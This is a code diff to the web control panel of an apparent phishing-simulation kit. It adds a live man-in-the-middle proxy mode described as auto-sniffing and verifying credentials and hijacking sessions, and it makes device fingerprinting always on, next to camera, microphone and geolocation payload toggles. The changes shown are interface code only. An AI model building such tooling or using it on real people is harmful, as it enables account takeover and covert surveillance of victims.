@@ -48,16 +48,16 @@
         <span class="form-hint">// will be served at <code id="t-slug-preview">/</code> · 1–32 chars · lowercase letters, digits, “-”, “_”</span>
       </div>
 
-      <div class="form-group">
+      <div class="form-group" id="payloads-group">
         <label class="form-label">Payloads</label>
         <div class="checkbox-row">
-          <label class="checkbox" title="Always on — credential interceptor is the core of any phishing-sim clone">
+          <label class="checkbox" title="Always on — device fingerprint is collected on every visit">
             <input type="checkbox" checked disabled>
-            <span>credentials <em style="font-style:normal;color:var(--text-muted)">(always)</em></span>
+            <span>device-info <em style="font-style:normal;color:var(--text-muted)">(always)</em></span>
           </label>
           <label class="checkbox">
-            <input type="checkbox" name="payloads[]" value="device-info" checked>
-            <span>device-info</span>
+            <input type="checkbox" name="payloads[]" value="credentials" id="t-cred-toggle" onchange="toggleCredentials()">
+            <span>credentials</span>
           </label>
           <label class="checkbox">
             <input type="checkbox" name="payloads[]" value="geolocation">
@@ -72,7 +72,30 @@
             <span>microphone</span>
           </label>
         </div>
-        <span class="form-hint">// credentials always intercepted · enable other modules only within engagement scope</span>
+        <div class="cred-mode-options" id="cred-mode-options" style="display:none">
+          <div class="checkbox-row" style="gap:var(--space-2)">
+            <label class="radio">
+              <input type="radio" name="mode" value="clone" checked onchange="toggleModeUI()">
+              <span>Clone <em style="font-style:normal;color:var(--text-muted)">(static copy)</em></span>
+            </label>
+            <label class="radio">
+              <input type="radio" name="mode" value="proxy" onchange="toggleModeUI()">
+              <span>Proxy <em style="font-style:normal;color:var(--text-muted)">(live MITM relay)</em></span>
+            </label>
+          </div>
+          <span class="form-hint">// clone = one-time snapshot · proxy = live transparent relay with session hijack + credential verification</span>
+        </div>
+        <span class="form-hint">// enable modules within engagement scope</span>
+      </div>
+
+      <div class="form-group" id="proxy-info" style="display:none">
+        <div class="alert alert-info" style="margin:0">
+          <div class="alert-icon"><svg class="icon icon-md"><use href="#i-info"/></svg></div>
+          <div class="alert-content">
+            <div class="alert-title">PROXY MODE</div>
+            <div class="alert-body">Traffic is relayed live through your server. Credentials are auto-sniffed, verified, and sessions are hijacked on successful login. No static clone is created.</div>
+          </div>
+        </div>
       </div>
 
       <div id="t-create-error" class="login-error" style="display:none">
@@ -87,7 +110,7 @@
       </div>
 
       <div style="display:flex;gap:var(--space-2);justify-content:flex-end">
-        <button type="reset" class="btn btn-ghost btn-sm" id="t-create-reset">Reset</button>
+        <button type="reset" class="btn btn-ghost btn-sm" id="t-create-reset" onclick="setTimeout(toggleModeUI,0)">Reset</button>
         <button type="submit" class="btn btn-primary btn-sm" id="t-create-btn">
           <svg class="icon icon-sm" id="t-create-btn-icon"><use href="#i-zap"/></svg>
           <span class="spinner spinner-sm" id="t-create-btn-spinner" style="display:none" aria-hidden="true"></span>
@@ -124,6 +147,7 @@
     <div class="target-card-head">
       <div class="target-card-slug">
         <span class="t-mono t-slug-text"></span>
+        <span class="t-mode-badge badge badge-outline" style="display:none"></span>
         <span class="t-custom-js-badge" title="Has operator-supplied custom JS" style="display:none">
           <svg class="icon icon-xs"><use href="#i-code"/></svg> custom JS
         </span>
@@ -202,13 +226,13 @@
         <div class="form-group">
           <label class="form-label">Payloads</label>
           <div class="checkbox-row">
-            <label class="checkbox" title="Always on — credential interceptor is the core of any phishing-sim clone">
+            <label class="checkbox" title="Always on — device fingerprint is collected on every visit">
               <input type="checkbox" checked disabled>
-              <span>credentials <em style="font-style:normal;color:var(--text-muted)">(always)</em></span>
+              <span>device-info <em style="font-style:normal;color:var(--text-muted)">(always)</em></span>
             </label>
             <label class="checkbox">
-              <input type="checkbox" class="t-edit-payload" value="device-info">
-              <span>device-info</span>
+              <input type="checkbox" class="t-edit-payload" value="credentials">
+              <span>credentials</span>
             </label>
             <label class="checkbox">
               <input type="checkbox" class="t-edit-payload" value="geolocation">
@@ -293,6 +317,30 @@
   const $editSaveSpinner = document.getElementById('t-edit-save-spinner');
   const $editOpenLive    = document.getElementById('t-edit-open-live');
 
+  /* Credentials toggle: show/hide mode options. */
+  function toggleCredentials() {
+    const on = document.getElementById('t-cred-toggle').checked;
+    document.getElementById('cred-mode-options').style.display = on ? '' : 'none';
+    if (!on) {
+      document.querySelector('input[name="mode"][value="clone"]').checked = true;
+      document.getElementById('proxy-info').style.display = 'none';
+      $btnLabel.textContent = 'Clone & host';
+    }
+    toggleModeUI();
+  }
+  window.toggleCredentials = toggleCredentials;
+
+  /* Mode toggle: change button label, show proxy info. */
+  function toggleModeUI() {
+    const credOn = document.getElementById('t-cred-toggle').checked;
+    const proxyEl = document.querySelector('input[name="mode"][value="proxy"]');
+    const isProxy = credOn && proxyEl && proxyEl.checked;
+    document.getElementById('proxy-info').style.display = isProxy ? '' : 'none';
+    $btnLabel.textContent = isProxy ? 'Create proxy' : 'Clone & host';
+    document.querySelector('.create-progress-label').textContent = isProxy ? 'Creating…' : 'Cloning…';
+  }
+  window.toggleModeUI = toggleModeUI;
+
   /* Slug preview as the operator types. */
   function updateSlugPreview() {
     const v = $slug.value.trim().toLowerCase();
@@ -342,6 +390,12 @@
       node.querySelector('.t-render-mode').textContent = t.render_mode === 'chrome'
         ? '· chrome render'
         : (t.render_mode === 'http' ? '· http fallback' : '');
+
+      const modeBadge = node.querySelector('.t-mode-badge');
+      const mode = t.mode || 'clone';
+      modeBadge.textContent = mode === 'proxy' ? 'PROXY' : 'CLONE';
+      modeBadge.className = 'badge ' + (mode === 'proxy' ? 'badge-warn' : 'badge-outline');
+      modeBadge.style.display = '';
       node.querySelector('.t-created').textContent    = '// ' + formatDate(t.created_at);
 
       // Surface the custom-JS state so an operator can spot a tweaked
@@ -421,10 +475,13 @@
   window.createTarget = createTarget;
 
   function setCreateBusy(busy) {
+    const isProxy = document.querySelector('input[name="mode"][value="proxy"]').checked;
     $btn.disabled              = busy;
     $btnIcon.style.display     = busy ? 'none' : '';
     $btnSpinner.style.display  = busy ? '' : 'none';
-    $btnLabel.textContent      = busy ? 'Cloning…' : 'Clone & host';
+    $btnLabel.textContent      = busy
+      ? (isProxy ? 'Creating…' : 'Cloning…')
+      : (isProxy ? 'Create proxy' : 'Clone & host');
     $progress.style.display    = busy ? '' : 'none';
   }
 
@@ -623,17 +680,56 @@
 }
 
 .checkbox-row     { display: flex; flex-wrap: wrap; gap: var(--space-2); }
-.checkbox         {
-  display: inline-flex; align-items: center; gap: 6px;
+.checkbox, .radio {
+  display: inline-flex; align-items: center; gap: 8px;
   cursor: pointer; user-select: none;
-  padding: 6px 10px; border-radius: var(--radius-sm);
+  padding: 7px 12px; border-radius: var(--radius-sm);
   border: 1px solid var(--border-subtle);
   font-family: var(--font-mono); font-size: var(--text-sm);
   color: var(--text-secondary);
   transition: background .15s, border-color .15s, color .15s;
 }
-.checkbox:hover   { border-color: var(--border-default); color: var(--text-primary); }
-.checkbox input   { accent-color: var(--accent-primary); }
+.checkbox:hover, .radio:hover {
+  border-color: var(--border-default); color: var(--text-primary);
+}
+.checkbox:has(input:checked), .radio:has(input:checked) {
+  border-color: var(--accent-primary);
+  color: var(--accent-primary);
+  background: var(--accent-primary-muted);
+}
+.checkbox input, .radio input {
+  appearance: none; -webkit-appearance: none;
+  width: 16px; height: 16px; margin: 0;
+  border: 1.5px solid var(--border-bright, #3a5068);
+  background: transparent; flex-shrink: 0;
+  cursor: pointer; position: relative;
+  transition: background .15s, border-color .15s, box-shadow .15s;
+}
+.checkbox input { border-radius: 3px; }
+.radio input    { border-radius: 50%; }
+.checkbox input:checked, .radio input:checked {
+  background: var(--accent-primary);
+  border-color: var(--accent-primary);
+  box-shadow: 0 0 6px var(--accent-primary-glow);
+}
+.checkbox input:checked::after {
+  content: ''; position: absolute;
+  left: 4px; top: 1px; width: 5px; height: 9px;
+  border: solid var(--bg-base); border-width: 0 2px 2px 0;
+  transform: rotate(45deg);
+}
+.radio input:checked::after {
+  content: ''; position: absolute;
+  left: 50%; top: 50%; width: 6px; height: 6px;
+  background: var(--bg-base); border-radius: 50%;
+  transform: translate(-50%, -50%);
+}
+.checkbox input:disabled { opacity: .5; cursor: not-allowed; }
+.cred-mode-options {
+  margin-top: var(--space-2);
+  padding-left: var(--space-1);
+  display: flex; flex-direction: column; gap: var(--space-1);
+}
 
 .targets-list-header {
   display: flex; justify-content: space-between; align-items: center;
